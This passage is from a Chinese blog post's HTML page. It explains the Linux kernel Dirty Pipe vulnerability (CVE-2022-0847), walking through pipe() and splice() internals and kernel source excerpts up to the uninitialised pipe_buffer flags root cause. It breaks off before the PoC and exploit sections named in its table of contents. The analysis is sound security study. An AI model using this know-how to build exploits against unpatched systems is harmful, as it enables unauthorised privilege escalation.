<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="本文的复现环境为 Linux 5.8.1，下载地址https:&#x2F;&#x2F;cdn.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F;v5.x&#x2F;linux-5.8.1.tar.gz本人仓库见https:&#x2F;&#x2F;github.com&#x2F;NazrinDuck&#x2F;CVE-Reproduce&#x2F;tree&#x2F;master&#x2F;CVE-2022-0847  漏洞背景最早发现者自述在这里，通过一个偶然的CRC校验失败发现了一个强">
<meta property="og:type" content="article">
<meta property="og:title" content="[CVE-2022-0847] dirty pipe 复现">
<meta property="og:url" content="http://example.com/2025/10/30/cve-2022-0847/index.html">
<meta property="og:site_name" content="Blog de Назриндак">
<meta property="og:description" content="本文的复现环境为 Linux 5.8.1，下载地址https:&#x2F;&#x2F;cdn.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F;v5.x&#x2F;linux-5.8.1.tar.gz本人仓库见https:&#x2F;&#x2F;github.com&#x2F;NazrinDuck&#x2F;CVE-Reproduce&#x2F;tree&#x2F;master&#x2F;CVE-2022-0847  漏洞背景最早发现者自述在这里，通过一个偶然的CRC校验失败发现了一个强">
<meta property="og:locale">
<meta property="og:image" content="http://example.com/images/CVE/CVE-2022-0847/call_chains.png">
<meta property="og:image" content="http://example.com/images/CVE/CVE-2022-0847/splice.png">
<meta property="og:image" content="http://example.com/images/CVE/CVE-2022-0847/pipe.png">
<meta property="og:image" content="http://example.com/images/CVE/CVE-2022-0847/PoC.png">
<meta property="og:image" content="http://example.com/images/CVE/CVE-2022-0847/Exp.png">
<meta property="article:published_time" content="2025-10-30T09:09:12.000Z">
<meta property="article:modified_time" content="2025-10-30T18:14:26.467Z">
<meta property="article:author" content="NázrinKacsa">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/CVE/CVE-2022-0847/call_chains.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>[CVE-2022-0847] dirty pipe 复现</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-86660611-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li><!--
     --><!--
       --><li><a href="/tags">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/10/26/2025qwnt/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/10/30/cve-2022-0847/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/10/30/cve-2022-0847/&text=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/10/30/cve-2022-0847/&is_video=false&description=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[CVE-2022-0847] dirty pipe 复现&body=Check out this article: http://example.com/2025/10/30/cve-2022-0847/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/10/30/cve-2022-0847/&name=[CVE-2022-0847] dirty pipe 复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/10/30/cve-2022-0847/&t=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">漏洞背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe"><span class="toc-number">1.1.</span> <span class="toc-text">pipe()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#splice"><span class="toc-number">1.2.</span> <span class="toc-text">splice()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC-%E9%83%A8%E5%88%86"><span class="toc-number">3.1.</span> <span class="toc-text">PoC 部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-%E9%83%A8%E5%88%86"><span class="toc-number">3.2.</span> <span class="toc-text">Exp 部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">完整代码</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        [CVE-2022-0847] dirty pipe 复现
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">NázrinKacsa</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-10-30T09:09:12.000Z" class="dt-published" itemprop="datePublished">2025-10-30</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CVE/" rel="tag">CVE</a>, <a class="p-category" href="/tags/kernel/" rel="tag">kernel</a>
    </div>


      <span id="busuanzi_container_page_pv">
        本文总阅读量<span id="busuanzi_value_page_pv"></span>次
      </span>
    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <blockquote>
<p>本文的复现环境为 Linux 5.8.1，下载地址<a target="_blank" rel="noopener" href="https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.8.1.tar.gz">https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.8.1.tar.gz</a><br>本人仓库见<a target="_blank" rel="noopener" href="https://github.com/NazrinDuck/CVE-Reproduce/tree/master/CVE-2022-0847">https://github.com/NazrinDuck/CVE-Reproduce/tree/master/CVE-2022-0847</a></p>
</blockquote>
<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>最早发现者自述<a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">在这里</a>，通过一个偶然的CRC校验失败发现了一个强大的kernel bug。<del>跑日志服务器也算做是fuzz</del></p>
<p>开始之前简介一下<code>pipe()</code>函数和<code>splice()</code>函数</p>
<h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe()"></a>pipe()</h3><p>前者在Kernel Pwn很常见，正常可用于进程间通信等地方，如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">  pipe(fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">    read(fd[<span class="number">0</span>], buffer, <span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// buffer will be &quot;aaaabbbb&quot;</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    write(fd[<span class="number">1</span>], <span class="string">&quot;aaaabbbb&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在写入管道时，最终会调用<code>pipe_read()</code>函数，如果之前没有写入会分配一个<code>pipe_buffer</code>和一个页框，并且设置<code>pipe_buffer</code>的<code>flag</code>字段为<code>PIPE_BUF_FLAG_CAN_MERGE</code></p>
<figure class="highlight c"><figcaption><span>pipe_write</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8.1/source/fs/pipe.c#L528">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">   buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">   buf-&gt;page = page;</span><br><span class="line">   buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">   buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">   buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">    buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">    buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">   pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而且，如果<code>flag</code>字段被设置为<code>PIPE_BUF_FLAG_CAN_MERGE</code>，在之后的写入时会接着写入到该page中去</p>
<figure class="highlight c"><figcaption><span>pipe_write</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8.1/source/fs/pipe.c#L469">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">      offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">   ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">   <span class="keyword">if</span> (ret)</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">   ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">   <span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">    ret = -EFAULT;</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   buf-&gt;len += ret;</span><br><span class="line">   <span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="splice"><a href="#splice" class="headerlink" title="splice()"></a>splice()</h3><p>后者可以用来实现“零拷贝”传递数据，减少了内核态与用户态的切换，效率更高，如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _FILE_OFFSET_BITS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="type">int</span> pfd[<span class="number">2</span>];</span><br><span class="line">  <span class="type">off_t</span> off;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> s[<span class="number">12</span>] = <span class="string">&quot;Hello, world&quot;</span>;</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;out&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0666</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe(pfd) == <span class="number">-1</span>)</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;pipe&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write(pfd[<span class="number">1</span>], s, <span class="keyword">sizeof</span>(s)) != <span class="keyword">sizeof</span>(s))</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (close(pfd[<span class="number">1</span>]) == <span class="number">-1</span>)</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;close&quot;</span>);</span><br><span class="line"></span><br><span class="line">  off = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> (splice(pfd[<span class="number">0</span>], <span class="literal">NULL</span>, fd, &amp;off, <span class="keyword">sizeof</span>(s), <span class="number">0</span>) != <span class="keyword">sizeof</span>(s))</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;splice&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (close(pfd[<span class="number">0</span>]) == <span class="number">-1</span>)</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;close&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New offset is %jd\n&quot;</span>, (<span class="type">intmax_t</span>)off);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close(fd) == <span class="number">-1</span>)</span><br><span class="line">    err(EXIT_FAILURE, <span class="string">&quot;close&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>splice()</code>函数在libc中的原型如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">off_t</span> *_Nullable off_in,</span></span><br><span class="line"><span class="params">                      <span class="type">int</span> fd_out, <span class="type">off_t</span> *_Nullable off_out,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span> size, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>

<p>其中，<code>off_in</code>参数和<code>off_out</code>参数在不使用时可设置为<code>NULL</code></p>
<p>当<code>flag</code>参数设置为<code>SPLICE_F_MOVE</code>时，该函数可以实现数据从<code>fd_in</code>到<code>fd_out</code>的零拷贝复制，类似与<code>sendfile</code>系统调用，但是规定这两个文件描述符中必须有一个是pipe</p>
<figure class="highlight c"><figcaption><span>do_splice</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8.1/source/fs/splice.c#L1155">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_splice</span><span class="params">(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> __user *off_in,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> file *out, <span class="type">loff_t</span> __user *off_out,</span></span><br><span class="line"><span class="params">  <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (opipe) &#123;</span><br><span class="line">  <span class="keyword">if</span> (off_out)</span><br><span class="line">   <span class="keyword">return</span> -ESPIPE;</span><br><span class="line">  <span class="keyword">if</span> (off_in) &#123;</span><br><span class="line">   <span class="keyword">if</span> (!(in-&gt;f_mode &amp; FMODE_PREAD))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">   <span class="keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   offset = in-&gt;f_pos;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">   flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line">  pipe_lock(opipe);</span><br><span class="line">  ret = wait_for_space(opipe, flags);</span><br><span class="line">  <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">   <span class="type">unsigned</span> <span class="type">int</span> p_space;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Don&#x27;t try to read more the pipe has space for. */</span></span><br><span class="line">   p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);</span><br><span class="line">   len = <span class="type">min_t</span>(<span class="type">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">   ret = do_splice_to(in, &amp;offset, opipe, len, flags);</span><br><span class="line">  &#125;</span><br><span class="line">  pipe_unlock(opipe);</span><br><span class="line">  <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">   wakeup_pipe_readers(opipe);</span><br><span class="line">  <span class="keyword">if</span> (!off_in)</span><br><span class="line">   in-&gt;f_pos = offset;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (copy_to_user(off_in, &amp;offset, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line">   ret = -EFAULT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上为当<code>out</code>参数为管道时的执行流，最终程序会进入<code>do_splice_to()</code>函数，然后间接调用函数<code>generic_file_buffered_read()</code></p>
<figure class="highlight c"><figcaption><span>generic_file_buffered_read</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8.1/source/mm/filemap.c#L2130">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">generic_file_buffered_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> iov_iter *iter, <span class="type">ssize_t</span> written)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Ok, we have the page, and it&#x27;s up-to-date, so</span></span><br><span class="line"><span class="comment">   * now we can copy it to user space...</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  ret = copy_page_to_iter(page, offset, nr, iter);</span><br><span class="line">  offset += ret;</span><br><span class="line">  index += offset &gt;&gt; PAGE_SHIFT;</span><br><span class="line">  offset &amp;= ~PAGE_MASK;</span><br><span class="line">  prev_offset = offset;</span><br><span class="line"></span><br><span class="line">  put_page(page);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到此为止的调用链如下所示</p>
<p><img src="/images/CVE/CVE-2022-0847/call_chains.png" alt="call_chains"></p>
<p><code>splice()</code>实现了将pipe_buffer中的page直接用文件的page替换掉，我们在pipe中读写，事实上就是在pipe指向的物理页框里读写，在这种情况下是直接在文件中读写</p>
<blockquote>
<p><img src="/images/CVE/CVE-2022-0847/splice.png" alt="splice"><br><img src="/images/CVE/CVE-2022-0847/pipe.png" alt="pipe"><br>被替换掉的<code>ops</code>如上所示</p>
</blockquote>
<p>最终，程序进入函数<code>copy_page_to_iter()</code>，接着进入函数<code>copy_page_to_iter_pipe()</code></p>
<figure class="highlight c"><figcaption><span>copy_page_to_iter_pipe</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.8.1/source/lib/iov_iter.c#L368">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"> buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line"> get_page(page);</span><br><span class="line"> buf-&gt;page = page;</span><br><span class="line"> buf-&gt;offset = offset;</span><br><span class="line"> buf-&gt;len = bytes;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来到了这个最关键的地方。接下来我们介绍具体的漏洞成因</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>注意这个初始化，它设置了<code>struct pipe_buffer</code>的若干字段，但是**忘记设置了<code>flags</code>**这个字段！</p>
<blockquote>
<p>结构体如下所示</p>
